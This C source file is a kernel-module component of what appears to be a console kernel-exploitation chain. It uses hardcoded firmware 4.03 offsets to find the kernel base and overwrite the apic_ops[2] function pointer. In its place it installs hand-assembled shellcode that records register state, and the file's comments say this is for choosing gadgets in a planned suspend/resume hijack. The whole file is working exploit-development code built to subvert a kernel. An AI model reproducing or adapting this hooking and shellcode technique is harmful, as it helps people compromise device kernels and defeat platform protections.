#include <stdint.h>

/*
 * register_capture — Capture register state at apic_ops[2] call site
 *
 * Overwrites apic_ops[2] with a trampoline that saves all registers
 * to a kdata capture buffer, calls the original xapic_mode, restores
 * registers, and returns the original result.
 *
 * The trampoline is position-independent shellcode written to malloc'd
 * kernel memory with NX cleared.
 *
 * After the kernel naturally calls apic_ops[2] (during LAPIC operations),
 * the captured registers reveal what the execution context looks like.
 * This tells us what gadgets are viable for the suspend/resume hijack.
 *
 * The trampoline runs on whatever CPU/thread calls apic_ops[2] — NOT
 * on our kthread. So the capture buffer is at a fixed kdata address
 * (kdata_base + 0x200) that both contexts can access.
 *
 * Mode (via fw_ver):
 *   0x403: ARM — install trampoline, spin-wait for capture, restore original
 *   0x2:   READ — just read back the capture buffer from kdata (post-reboot)
 *
 * Output layout (uint64_t indices):
 *   [0]   magic "RCAP" (0x52434150) | status(32)
 *   [1]   kdata_base
 *   [2]   ktext_base
 *   [3]   phase
 *   [4]   trampoline_addr (where shellcode was placed)
 *   [5]   original_xapic_mode
 *   [6]   capture_buf_addr (kdata+0x200)
 *   [7]   capture_count (how many times trampoline fired)
 *
 *   --- Captured registers (from kdata+0x200) ---
 *   [10]  RAX   [11]  RBX   [12]  RCX   [13]  RDX
 *   [14]  RSI   [15]  RDI   [16]  RBP   [17]  RSP (at entry, before call pushed retaddr)
 *   [18]  R8    [19]  R9    [20]  R10   [21]  R11
 *   [22]  R12   [23]  R13   [24]  R14   [25]  R15
 *   [26]  return_address (where the call came from — ktext addr)
 *   [27]  RFLAGS
 *   [28]  capture_magic (0xCAP70000)
 *
 *   [40]  sentinel 0xdeadbeefcafe0010
 */

#define MAGIC_RCAP       0x52434150  /* "RCAP" */
#define CAPTURE_MAGIC    0xCAB70000CAB70000ULL

/* FW 4.03 offsets */
#define APIC_OPS_OFF_FROM_KTEXT  0x1934AC8
#define NOP_RET_OFF      (-0x9d20ca)

/* kdata capture buffer location */
#define KDATA_CAP_OFF    0x200

/* Capture buffer layout (qword indices from kdata+0x200) */
#define CAP_RAX     0
#define CAP_RBX     1
#define CAP_RCX     2
#define CAP_RDX     3
#define CAP_RSI     4
#define CAP_RDI     5
#define CAP_RBP     6
#define CAP_RSP     7
#define CAP_R8      8
#define CAP_R9      9
#define CAP_R10     10
#define CAP_R11     11
#define CAP_R12     12
#define CAP_R13     13
#define CAP_R14     14
#define CAP_R15     15
#define CAP_RETADDR 16
#define CAP_RFLAGS  17
#define CAP_MAGIC   18
#define CAP_COUNT   19
#define CAP_TOTAL   20

#define MIN_KERN_ADDR    0xFFFF800000000000ULL

/*
 * Static buffer for the trampoline shellcode.
 * Lives in the kmod's .data section, which is part of the exec_code
 * allocation that kldload already NX-clears. So this buffer is
 * automatically executable — no DMAP walk or NX clearing needed.
 */
static uint8_t trampoline_buf[256] __attribute__((aligned(16)));

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t*)addr;
}

static inline void write8(uint64_t addr, uint64_t val)
{
    *(volatile uint64_t*)addr = val;
}

/*
 * Build the trampoline shellcode.
 *
 * The trampoline must:
 * 1. Check if capture already done (capture_magic set) — if so, just call original
 * 2. Save all registers to capture buffer
 * 3. Save return address (from stack) to capture buffer
 * 4. Call original xapic_mode function
 * 5. Return with original result in RAX
 *
 * The shellcode uses two embedded 64-bit values:
 *   - capture_buf_addr: absolute address of kdata capture buffer
 *   - original_func:    absolute address of original xapic_mode
 *
 * Layout:
 *   [0x00] push rbx                        ; save scratch reg
 *   [0x01] mov rbx, [rip+capture_addr_off] ; rbx = capture_buf
 *   [0x08] cmpq $CAPTURE_MAGIC, 18*8(rbx)  ; already captured?
 *          je skip_capture
 *
 *   --- save all regs to [rbx] ---
 *   [....] mov [rbx+0*8], rax
 *          ... (all regs)
 *   [....] mov rax, [rsp+8]               ; return address (past our push rbx)
 *   [....] mov [rbx+16*8], rax            ; save retaddr
 *   [....] pushfq / pop rax / mov [rbx+17*8], rax  ; save flags
 *   [....] mov qword [rbx+18*8], CAPTURE_MAGIC     ; mark as captured
 *   [....] incq [rbx+19*8]                ; increment count
 *
 * skip_capture:
 *   [....] pop rbx                        ; restore
 *   [....] jmp original_func              ; tail-call original (preserves stack)
 *
 * We embed capture_buf_addr and original_func as data after the code.
 */
static uint32_t build_trampoline(uint8_t *buf, uint64_t capture_buf_addr, uint64_t original_func)
{
    uint32_t p = 0;

    /* push rbx */
    buf[p++] = 0x53;

    /* push rcx (we need a second scratch) */
    buf[p++] = 0x51;

    /* mov rbx, [rip + DATA_OFF] — load capture_buf_addr
     * We'll patch the relative offset after we know the code length */
    uint32_t load_cap_pos = p;
    buf[p++] = 0x48; buf[p++] = 0x8b; buf[p++] = 0x1d;
    buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x00; /* rip-rel32, patched later */

    /* cmp qword [rbx + 18*8], CAPTURE_MAGIC (low 32 bits first) */
    /* Use: mov rcx, [rbx + 18*8]; mov rax, CAPTURE_MAGIC; cmp rcx, rax; je skip */
    /* Actually simpler: check if [rbx + 18*8] is nonzero */
    /* cmpq $0, 0x90(%rbx) */
    buf[p++] = 0x48; buf[p++] = 0x83; buf[p++] = 0xbb;
    buf[p++] = 0x90; buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x00;  /* disp32 = 0x90 = 18*8 */
    buf[p++] = 0x00;  /* cmp with 0 */

    /* jne do_capture (if [capture_magic] == 0, do capture; if nonzero, skip) */
    /* Wait, we want: if already captured (nonzero), skip. So: jne skip_capture */
    uint32_t jne_pos = p;
    buf[p++] = 0x75;
    buf[p++] = 0x00; /* rel8 offset, patched later */

    /* --- DO CAPTURE --- */

    /* Save RAX: first recover original RAX (not clobbered yet except by our cmp?) */
    /* Actually RAX hasn't been clobbered - we used cmpq with memory, not rax */
    /* mov [rbx + 0*8], rax */
    buf[p++] = 0x48; buf[p++] = 0x89; buf[p++] = 0x03;  /* mov [rbx], rax */

    /* mov [rbx + 2*8], rcx — but rcx was pushed, need original */
    /* Get original rcx from stack: [rsp+0]=rcx_saved, [rsp+8]=rbx_saved, [rsp+16]=retaddr */
    /* mov rcx, [rsp] — original rcx */
    buf[p++] = 0x48; buf[p++] = 0x8b; buf[p++] = 0x0c; buf[p++] = 0x24;
    buf[p++] = 0x48; buf[p++] = 0x89; buf[p++] = 0x4b; buf[p++] = 0x10; /* mov [rbx+0x10], rcx */

    /* Get original rbx from stack: [rsp+8] */
    buf[p++] = 0x48; buf[p++] = 0x8b; buf[p++] = 0x4c; buf[p++] = 0x24; buf[p++] = 0x08;
    buf[p++] = 0x48; buf[p++] = 0x89; buf[p++] = 0x4b; buf[p++] = 0x08; /* mov [rbx+0x08], rcx (=orig rbx) */

    /* Now save the rest using rbx as base */
    /* mov [rbx+0x18], rdx */
    buf[p++] = 0x48; buf[p++] = 0x89; buf[p++] = 0x53; buf[p++] = 0x18;
    /* mov [rbx+0x20], rsi */
    buf[p++] = 0x48; buf[p++] = 0x89; buf[p++] = 0x73; buf[p++] = 0x20;
    /* mov [rbx+0x28], rdi */
    buf[p++] = 0x48; buf[p++] = 0x89; buf[p++] = 0x7b; buf[p++] = 0x28;
    /* mov [rbx+0x30], rbp */
    buf[p++] = 0x48; buf[p++] = 0x89; buf[p++] = 0x6b; buf[p++] = 0x30;

    /* RSP: original = rsp + 16 (undo our 2 pushes) */
    /* lea rcx, [rsp+16] */
    buf[p++] = 0x48; buf[p++] = 0x8d; buf[p++] = 0x4c; buf[p++] = 0x24; buf[p++] = 0x10;
    /* mov [rbx+0x38], rcx */
    buf[p++] = 0x48; buf[p++] = 0x89; buf[p++] = 0x4b; buf[p++] = 0x38;

    /* mov [rbx+0x40], r8 */
    buf[p++] = 0x4c; buf[p++] = 0x89; buf[p++] = 0x43; buf[p++] = 0x40;
    /* mov [rbx+0x48], r9 */
    buf[p++] = 0x4c; buf[p++] = 0x89; buf[p++] = 0x4b; buf[p++] = 0x48;
    /* mov [rbx+0x50], r10 */
    buf[p++] = 0x4c; buf[p++] = 0x89; buf[p++] = 0x53; buf[p++] = 0x50;
    /* mov [rbx+0x58], r11 */
    buf[p++] = 0x4c; buf[p++] = 0x89; buf[p++] = 0x5b; buf[p++] = 0x58;
    /* mov [rbx+0x60], r12 */
    buf[p++] = 0x4c; buf[p++] = 0x89; buf[p++] = 0x63; buf[p++] = 0x60;
    /* mov [rbx+0x68], r13 */
    buf[p++] = 0x4c; buf[p++] = 0x89; buf[p++] = 0x6b; buf[p++] = 0x68;
    /* mov [rbx+0x70], r14 */
    buf[p++] = 0x4c; buf[p++] = 0x89; buf[p++] = 0x73; buf[p++] = 0x70;
    /* mov [rbx+0x78], r15 */
    buf[p++] = 0x4c; buf[p++] = 0x89; buf[p++] = 0x7b; buf[p++] = 0x78;

    /* Return address: [rsp+16] (past our 2 pushes, the call's retaddr) */
    /* mov rcx, [rsp+16] */
    buf[p++] = 0x48; buf[p++] = 0x8b; buf[p++] = 0x4c; buf[p++] = 0x24; buf[p++] = 0x10;
    /* mov [rbx+0x80], rcx */
    buf[p++] = 0x48; buf[p++] = 0x89; buf[p++] = 0x8b;
    buf[p++] = 0x80; buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x00;

    /* RFLAGS: pushfq, pop rcx, mov [rbx+0x88], rcx */
    buf[p++] = 0x9c;  /* pushfq */
    buf[p++] = 0x48; buf[p++] = 0x59;  /* pop rcx */
    buf[p++] = 0x48; buf[p++] = 0x89; buf[p++] = 0x8b;
    buf[p++] = 0x88; buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x00;

    /* Write capture magic: movabs rcx, CAPTURE_MAGIC; mov [rbx+0x90], rcx */
    buf[p++] = 0x48; buf[p++] = 0xb9;  /* movabs rcx, imm64 */
    *(uint64_t*)(buf + p) = CAPTURE_MAGIC; p += 8;
    buf[p++] = 0x48; buf[p++] = 0x89; buf[p++] = 0x8b;
    buf[p++] = 0x90; buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x00;

    /* Increment count: incq [rbx+0x98] */
    buf[p++] = 0x48; buf[p++] = 0xff; buf[p++] = 0x83;
    buf[p++] = 0x98; buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x00;

    /* --- SKIP CAPTURE LANDS HERE --- */
    uint32_t skip_target = p;
    buf[jne_pos + 1] = (uint8_t)(skip_target - (jne_pos + 2));

    /* pop rcx */
    buf[p++] = 0x59;
    /* pop rbx */
    buf[p++] = 0x5b;

    /* jmp [rip + DATA_OFF2] — tail-call original function */
    uint32_t jmp_orig_pos = p;
    buf[p++] = 0xff; buf[p++] = 0x25;
    buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x00; /* rip-rel32, patched later */

    /* Align to 8 bytes for data */
    while (p & 7) buf[p++] = 0xcc;

    /* DATA: capture_buf_addr */
    uint32_t data_cap_addr_off = p;
    *(uint64_t*)(buf + p) = capture_buf_addr; p += 8;

    /* DATA: original_func */
    uint32_t data_orig_func_off = p;
    *(uint64_t*)(buf + p) = original_func; p += 8;

    /* Patch RIP-relative offsets */
    /* load_cap: mov rbx, [rip + X] where RIP = load_cap_pos + 7 */
    *(int32_t*)(buf + load_cap_pos + 3) = (int32_t)(data_cap_addr_off - (load_cap_pos + 7));

    /* jmp [rip + X] where RIP = jmp_orig_pos + 6 */
    *(int32_t*)(buf + jmp_orig_pos + 2) = (int32_t)(data_orig_func_off - (jmp_orig_pos + 6));

    return p;
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t mode = args->fw_ver;
    volatile uint64_t* out = (volatile uint64_t*)args;
    volatile uint32_t* out32 = (volatile uint32_t*)args;

    /* Zero output */
    for (int i = 0; i < 50; i++)
        out[i] = 0;

    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;
    uint64_t apic_ops_addr = ktext_base + APIC_OPS_OFF_FROM_KTEXT;
    volatile uint64_t* apic_table = (volatile uint64_t*)apic_ops_addr;
    uint64_t capture_buf = kdata_base + KDATA_CAP_OFF;

    out32[0] = MAGIC_RCAP;
    out[1] = kdata_base;
    out[2] = ktext_base;

    if (mode == 0x2) {
        /* Phase 2: READ mode — just read back capture buffer */
        out[3] = 2;
        out[5] = apic_table[2];
        out[6] = capture_buf;

        uint64_t cap_magic = read8(capture_buf + CAP_MAGIC * 8);
        out[28] = cap_magic;

        if (cap_magic != CAPTURE_MAGIC) {
            out32[1] = 0xFD;  /* no capture data */
            out[40] = 0xdeadbeefcafe0010ULL;
            return 0;
        }

        /* Read captured registers */
        for (int i = 0; i < CAP_TOTAL; i++)
            out[10 + i] = read8(capture_buf + i * 8);

        out[7] = read8(capture_buf + CAP_COUNT * 8);
        out32[1] = 0x0001;
        out[40] = 0xdeadbeefcafe0010ULL;
        return 0;
    }

    if (mode != 0x403) {
        out32[1] = 0xFF;
        out[40] = 0xdeadbeefcafe0010ULL;
        return 0;
    }

    /* Phase 1: ARM mode — build and install trampoline */
    out[3] = 1;

    uint64_t original_xapic = apic_table[2];
    out[5] = original_xapic;
    out[6] = capture_buf;

    /* Clear the capture buffer */
    for (int i = 0; i < CAP_TOTAL; i++)
        write8(capture_buf + i * 8, 0);

    /* Build trampoline in the static buffer (trampoline_buf).
     * This buffer is in the kmod's .data section, which lives in the
     * exec_code allocation that kldload already NX-cleared.
     * So it's automatically executable — no DMAP walk needed.
     *
     * The trampoline survives as long as exec_code isn't freed,
     * which is fine since we restore apic_ops[2] before returning.
     */
    uint64_t trampoline_addr = (uint64_t)trampoline_buf;
    build_trampoline(trampoline_buf, capture_buf, original_xapic);
    out[4] = trampoline_addr;

    /* Install trampoline: overwrite apic_ops[2] */
    apic_table[2] = trampoline_addr;

    /* Verify write */
    uint64_t readback = apic_table[2];
    if (readback != trampoline_addr) {
        out32[1] = 0xFE;  /* write failed */
        apic_table[2] = original_xapic;  /* restore */
        out[40] = 0xdeadbeefcafe0010ULL;
        return 0;
    }

    /* Spin-wait for the capture to fire.
     * The kernel calls apic_ops[2] during various LAPIC operations.
     * We wait up to ~5 seconds (500M iterations at ~10ns each). */
    volatile uint64_t *cap_magic_ptr = (volatile uint64_t *)(capture_buf + CAP_MAGIC * 8);
    uint64_t timeout = 500000000ULL;
    uint64_t captured = 0;

    for (uint64_t i = 0; i < timeout; i++) {
        if (*cap_magic_ptr != 0) {
            captured = 1;
            break;
        }
        __asm__ volatile("pause" ::: "memory");
    }

    /* Restore original apic_ops[2] immediately */
    apic_table[2] = original_xapic;

    out[7] = read8(capture_buf + CAP_COUNT * 8);

    if (captured) {
        /* Read captured registers into output */
        for (int i = 0; i < CAP_TOTAL; i++)
            out[10 + i] = read8(capture_buf + i * 8);

        out32[1] = 0x0001;  /* success */
    } else {
        out32[1] = 0x0002;  /* timeout — trampoline never fired */
        /* Still read whatever is in the buffer */
        for (int i = 0; i < CAP_TOTAL; i++)
            out[10 + i] = read8(capture_buf + i * 8);
    }

    out[40] = 0xdeadbeefcafe0010ULL;
    return 0;
}
